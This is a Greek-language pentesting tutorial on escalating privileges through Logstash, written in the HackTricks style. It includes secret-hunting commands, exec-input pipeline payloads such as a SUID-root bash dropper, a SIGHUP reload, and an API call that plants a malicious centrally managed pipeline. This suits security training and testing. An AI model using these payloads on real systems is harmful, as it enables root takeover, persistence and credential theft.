# Κλιμάκωση προνομίων στο Logstash

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Το Logstash χρησιμοποιείται για **τη συλλογή, τον μετασχηματισμό και την αποστολή logs** μέσω ενός συστήματος γνωστού ως **pipelines**. Αυτά τα pipelines αποτελούνται από στάδια **input**, **filter** και **output**.<sup>[[4]](#references)</sup> Μια ενδιαφέρουσα περίπτωση προκύπτει όταν το Logstash εκτελείται σε ένα παραβιασμένο μηχάνημα.

### Διαμόρφωση pipeline

Στις εγκαταστάσεις πακέτων Debian και RPM, τα pipelines διαμορφώνονται μέσω του **/etc/logstash/pipelines.yml**, το οποίο παραθέτει τις τοποθεσίες των διαμορφώσεων των pipelines· σε άλλες διανομές, το `pipelines.yml` βρίσκεται στον κατάλογο `path.settings` του Logstash.<sup>[[5]](#references)[[6]](#references)</sup>

```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
  path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
  path.config: "/usr/share/logstash/pipeline/1*.conf"
  pipeline.workers: 6
```

Αυτό το αρχείο αποκαλύπτει πού βρίσκονται τα αρχεία **.conf** που περιέχουν τις διαμορφώσεις pipeline. Όταν χρησιμοποιείται ένα **Elasticsearch output**, ελέγξτε τις ρυθμίσεις `user`/`password`, `cloud_auth` ή `api_key`· τα πραγματικά δικαιώματα του λογαριασμού εξαρτώνται από το Elasticsearch. Ένα glob στο `path.config` φορτώνει κάθε αρχείο που ταιριάζει για το συγκεκριμένο pipeline.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Αν το Logstash ξεκινήσει με `-f <directory>` αντί για `pipelines.yml`, το `-f` υπερισχύει και **όλα τα αρχεία μέσα σε αυτόν τον κατάλογο συνενώνονται με λεξικογραφική σειρά και αναλύονται ως ένα ενιαίο config**.<sup>[[6]](#references)[[7]](#references)</sup> Αυτό έχει 2 επιπτώσεις για επιθετικές ενέργειες:

- Ένα αρχείο που προστίθεται, όπως το `000-input.conf` ή το `zzz-output.conf`, μπορεί να αλλάξει τον τρόπο με τον οποίο συντίθεται το τελικό pipeline
- Ένα κακοσχηματισμένο αρχείο μπορεί να προκαλέσει αποτυχία επικύρωσης του συνενωμένου config· κατά την επαναφόρτωση, το Logstash διατηρεί το προηγούμενο pipeline, γι’ αυτό επικυρώστε τα payloads προτού βασιστείτε στο auto-reload.<sup>[[1]](#references)</sup>

### Γρήγορο Enumeration σε παραβιασμένο Host

Σε ένα μηχάνημα όπου είναι εγκατεστημένο το Logstash, ελέγξτε γρήγορα:

```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```

Ελέγξτε επίσης αν το τοπικό monitoring API είναι προσβάσιμο. Από προεπιλογή, δεσμεύεται στη διεύθυνση **127.0.0.1:9600**, κάτι που συνήθως αρκεί αφού αποκτήσετε πρόσβαση στον host.<sup>[[8]](#references)</sup>

```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```

Αυτά τα endpoints εκθέτουν IDs και ρυθμίσεις pipeline, μετρικές runtime και μετρητές επιτυχίας/αποτυχίας επαναφόρτωσης ρυθμίσεων, βοηθώντας να επιβεβαιωθεί αν έγινε αποδεκτή μια αλλαγή.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

Αν ένα ανακτημένο credential αφορά το **Elasticsearch**, δείτε [αυτήν τη σελίδα για το Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### File input που τροφοδοτεί δυναμικό command output

Μια ρύθμιση pipeline μπορεί να είναι μόνο για ανάγνωση από τον τρέχοντα χρήστη, ενώ το [file input](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-file) της παρακολουθεί μια διαδρομή στην οποία ο χρήστης μπορεί να γράψει. Ακολουθήστε το φορτωμένο pipeline από αυτό το input, μέσω οποιουδήποτε [Grok field capture](https://www.elastic.co/docs/reference/logstash/plugins/plugins-filters-grok), έως ένα [exec output](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-exec). Το exec output περνά το `command` μέσω ενός shell και αντικαθιστά τις τιμές `%{field}` χωρίς να καθαρίζει τους μεταχαρακτήρες του shell. Μια διαδρομή input στην οποία μπορεί να γίνει εγγραφή αποτελεί ένδειξη για πιθανή κλιμάκωση προνομίων μόνο αν η υπηρεσία εκτελείται με υψηλότερα προνόμια, το αρχείο του χρήστη μπορεί όντως να εισαχθεί στο παρακολουθούμενο input, τα φίλτρα και οι συνθήκες output δρομολογούν το περιεχόμενό του στο πεδίο command και το συγκεκριμένο output plugin είναι εγκατεστημένο και ενεργό. Ελέγξτε ξεχωριστά τα δικαιώματα αναζήτησης/εγγραφής στον κατάλογο, την κατάσταση παρακολούθησης του file input και τον πραγματικό λογαριασμό υπηρεσίας· μην γράφετε δοκιμαστικό event και μην καλείτε το output κατά την παθητική απαρίθμηση.

### Privilege Escalation μέσω εγγράψιμων Pipelines

Για να επιχειρήσετε privilege escalation, εντοπίστε πρώτα τον χρήστη με τον οποίο εκτελείται στην πράξη η υπηρεσία Logstash· μην υποθέσετε ότι είναι ο root ή ο χρήστης **logstash**. Βεβαιωθείτε ότι πληροίτε **ένα** από τα παρακάτω κριτήρια:

- Έχετε **δικαίωμα εγγραφής** σε ένα αρχείο pipeline **.conf** **ή**
- Το αρχείο **/etc/logstash/pipelines.yml** χρησιμοποιεί wildcard και μπορείτε να γράψετε στον φάκελο-στόχο.<sup>[[6]](#references)[[7]](#references)</sup>

Επιπλέον, πρέπει να ισχύει **μία** από τις παρακάτω συνθήκες:

- Έχετε τη δυνατότητα επανεκκίνησης της υπηρεσίας Logstash **ή**
- Το αρχείο **/etc/logstash/logstash.yml** έχει ορισμένο το **config.reload.automatic: true**.<sup>[[1]](#references)[[15]](#references)</sup>

Όταν υπάρχει wildcard στη ρύθμιση, η δημιουργία ενός αρχείου που ταιριάζει με αυτό το wildcard επιτρέπει την εκτέλεση εντολών.<sup>[[7]](#references)[[9]](#references)</sup> Για παράδειγμα:

```bash
input {
  exec {
    command => "whoami"
    interval => 120
  }
}

output {
  file {
    path => "/tmp/output.log"
    codec => rubydebug
  }
}
```

Εδώ, το **interval** καθορίζει τη συχνότητα εκτέλεσης σε δευτερόλεπτα. Στο συγκεκριμένο παράδειγμα, η εντολή **whoami** εκτελείται κάθε 120 δευτερόλεπτα και η έξοδός της κατευθύνεται στο **/tmp/output.log**.<sup>[[9]](#references)</sup>

Με **config.reload.automatic: true** στο **/etc/logstash/logstash.yml**, το Logstash εντοπίζει και εφαρμόζει αυτόματα νέες ή τροποποιημένες διαμορφώσεις pipeline, χωρίς να χρειάζεται επανεκκίνηση.<sup>[[1]](#references)[[15]](#references)</sup> Αν δεν υπάρχει wildcard, μπορούν και πάλι να γίνουν τροποποιήσεις στις υπάρχουσες διαμορφώσεις, αλλά συνιστάται προσοχή για την αποφυγή διακοπών.

### Πιο αξιόπιστα Pipeline Payloads

Το plugin εισόδου `exec` εξακολουθεί να λειτουργεί στις τρέχουσες εκδόσεις και απαιτεί είτε ένα `interval` είτε ένα `schedule`. Εκτελείται μέσω **forking** της JVM του Logstash, επομένως, αν η διαθέσιμη μνήμη είναι περιορισμένη, το payload σας μπορεί να αποτύχει με `ENOMEM`, αντί να εκτελεστεί σιωπηλά.<sup>[[9]](#references)</sup>

Όταν η υπηρεσία έχει επαρκή δικαιώματα για τη δημιουργία ενός αρχείου SUID που ανήκει στον root, ένα πρακτικό payload privilege-escalation είναι εκείνο που αφήνει πίσω του ένα μόνιμο artifact:

```bash
input {
  exec {
    command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
    interval => 300
  }
}
output {
  null {}
}
```

Αν δεν έχετε δικαιώματα επανεκκίνησης, αλλά μπορείτε να στείλετε σήμα στη διεργασία, το Logstash υποστηρίζει επίσης επαναφόρτωση με την αποστολή σήματος **SIGHUP** σε συστήματα τύπου Unix:<sup>[[1]](#references)</sup>

```bash
kill -SIGHUP $(pgrep -f logstash)
```

Να έχετε υπόψη ότι δεν υποστηρίζουν όλα τα plugins την επαναφόρτωση. Για παράδειγμα, το input **stdin** αποτρέπει την αυτόματη επαναφόρτωση, οπότε μην υποθέτετε ότι το `config.reload.automatic` θα εφαρμόζει πάντα τις αλλαγές σας.<sup>[[1]](#references)</sup>

### Υποκλοπή μυστικών από το Logstash

Πριν εστιάσετε αποκλειστικά στην εκτέλεση κώδικα, συλλέξτε τα δεδομένα στα οποία έχει ήδη πρόσβαση το Logstash:

- Τα διαπιστευτήρια μπορεί να εμφανίζονται σε outputs `elasticsearch {}`, σε URLs/ρυθμίσεις του `http_poller`, σε JDBC inputs ή σε ρυθμίσεις σχετικές με cloud· αυτά τα plugins περιέχουν πεδία διαπιστευτηρίων που αξίζει να αναζητήσετε.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Οι ασφαλείς ρυθμίσεις μπορεί να βρίσκονται στο **`/etc/logstash/logstash.keystore`** ή σε άλλον κατάλογο `path.settings`.<sup>[[5]](#references)[[10]](#references)</sup>
- Ο κωδικός πρόσβασης του keystore μπορεί να παρέχεται μέσω του **`LOGSTASH_KEYSTORE_PASS`**, ενώ οι εγκαταστάσεις RPM/DEB φορτώνουν τις μεταβλητές περιβάλλοντος της υπηρεσίας από το **`/etc/sysconfig/logstash`**.<sup>[[10]](#references)</sup>
- Η επέκταση μεταβλητών περιβάλλοντος με `${VAR}` επιλύεται κατά την εκκίνηση του Logstash, επομένως αξίζει να ελέγξετε το περιβάλλον της υπηρεσίας.<sup>[[14]](#references)</sup>

Χρήσιμοι έλεγχοι:

```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```

Αξίζει επίσης να ελεγχθεί, επειδή το **CVE-2023-46672** έδειξε ότι, υπό συγκεκριμένες συνθήκες, το Logstash κατέγραφε ευαίσθητες πληροφορίες στα logs του, συμπεριλαμβανομένων μυστικών που ήταν αποθηκευμένα στο keystore του και αναφέρονταν στη διαμόρφωση· ελέγξτε παλιά logs του Logstash και καταχωρίσεις του `journald`, αν ενδέχεται να ισχύουν αυτές οι συνθήκες.<sup>[[3]](#references)</sup>

### Κατάχρηση κεντρικής διαχείρισης Pipeline

Σε ορισμένα περιβάλλοντα, ο host δεν βασίζεται καθόλου σε τοπικά αρχεία `.conf`. Αν έχει διαμορφωθεί το **`xpack.management.enabled: true`**, το Logstash μπορεί να λαμβάνει κεντρικά διαχειριζόμενα pipelines από το Elasticsearch/Kibana και, αφού ενεργοποιηθεί αυτή η λειτουργία, οι τοπικές διαμορφώσεις pipeline παύουν να αποτελούν την κύρια πηγή αλήθειας.<sup>[[2]](#references)</sup>

Αυτό σημαίνει ότι υπάρχει διαφορετική διαδρομή επίθεσης:

1. Ανακτήστε διαπιστευτήρια Elastic από τις τοπικές ρυθμίσεις του Logstash, το keystore ή τα logs.<sup>[[3]](#references)[[10]](#references)</sup>
2. Επαληθεύστε αν ο λογαριασμός έχει το προνόμιο cluster **`manage_logstash_pipelines`**.<sup>[[16]](#references)</sup>
3. Δημιουργήστε ή αντικαταστήστε ένα κεντρικά διαχειριζόμενο pipeline, ώστε ο host του Logstash να εκτελέσει το payload σας στο επόμενο διάστημα polling.<sup>[[2]](#references)[[16]](#references)</sup>

Το API του Elasticsearch που χρησιμοποιείται για αυτήν τη λειτουργία είναι:<sup>[[16]](#references)</sup>

```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
  -H 'Content-Type: application/json' \
  -u user:password \
  -d '{
    "description": "malicious pipeline",
    "last_modified": "2026-01-02T02:50:51.250Z",
    "username": "user",
    "pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
    "pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
    "pipeline_settings": {
      "pipeline.workers": 1,
      "pipeline.batch.size": 1,
      "pipeline.batch.delay": 50,
      "queue.type": "memory",
      "queue.max_bytes": "1gb",
      "queue.checkpoint.writes": 1024
    }
  }'
```

Αυτό είναι ιδιαίτερα χρήσιμο όταν τα τοπικά αρχεία είναι μόνο για ανάγνωση, αλλά το Logstash είναι ήδη καταχωρισμένο ώστε να ανακτά pipelines απομακρυσμένα.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Έγγραφα Elastic: Επαναφόρτωση του αρχείου διαμόρφωσης](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Έγγραφα Elastic: Διαμόρφωση κεντρικής διαχείρισης pipelines](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Ενημέρωση ασφαλείας Logstash 8.11.1 (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Έγγραφα Elastic: Δημιουργία pipeline Logstash](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Έγγραφα Elastic: Διάταξη καταλόγων Logstash](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Έγγραφα Elastic: Πολλαπλά pipelines](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Έγγραφα Elastic: Εκτέλεση του Logstash από τη γραμμή εντολών](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Έγγραφα Elastic: Παρακολούθηση του Logstash με API](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Έγγραφα Elastic: Πρόσθετο εισόδου Exec](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Έγγραφα Elastic: Keystore μυστικών για ασφαλείς ρυθμίσεις](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Έγγραφα Elastic: Πρόσθετο εξόδου Elasticsearch](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Έγγραφα Elastic: Πρόσθετο εισόδου Http_poller](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Έγγραφα Elastic: Πρόσθετο εισόδου Jdbc](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Έγγραφα Elastic: Χρήση μεταβλητών περιβάλλοντος](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Έγγραφα Elastic: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [API Elasticsearch: Δημιουργία ή ενημέρωση pipeline Logstash](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [API Logstash: Λήψη ρυθμίσεων για pipelines](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [API Logstash: Λήψη στατιστικών για pipelines](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
